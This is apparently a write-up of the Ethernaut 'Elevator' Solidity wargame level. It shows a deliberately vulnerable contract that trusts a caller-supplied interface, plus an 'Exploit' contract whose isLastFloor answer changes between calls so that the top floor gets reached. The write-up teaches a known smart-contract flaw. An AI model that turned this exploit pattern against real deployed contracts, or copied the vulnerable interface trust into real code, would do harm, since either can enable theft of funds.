# Ethernaut 11: Elevator - understanding Interfaces

The learning is calling an interface exposes you to re-entrance (later exercise) and gives you no control what code is executed, it might be malicous code or something completly diffrent as you expect.

## The Task Intro

You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity&#39;s documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.

Funnily the question is not asked in the task intro, but it is obvious that we can only can call the goTo function and that isLastFloor is an interface function. The problem with this function is it does not let you into the last floor, it must be false to get inside the if block, but that causes the top variable always to be false, meaning the top floor is never reached.

The question I give myself is: How to get in the last floor?

## The Task Code

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

## The Solution

The main idea here not to call the elevator contract directly but by another smart contract. This contract will implement the isLastFloor function. The goTo function casts the msg.sender to the Building Interface, which means our smart contracts implementation is being called.

In my implementation there is a counter that the first time the function is called is false and the top floor is set. All following calls true is only returned if the top floor is reached. With this implementation I fixed the flawed original contract. This would be a white hat exploit.

```apache
contract Exploit is Building {
    Elevator el;
    uint counter;
    uint topFloor;

    constructor(Elevator _el) {
        el = _el;
    }

    function attack(uint _floor) external {
        el.goTo(_floor);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (counter == 0) {
            counter++;
            topFloor = _floor;
            return false;
        } else {
            if (_floor == topFloor) {
                return true;
            } else {
                return false;
            }
        }
    }
}
```
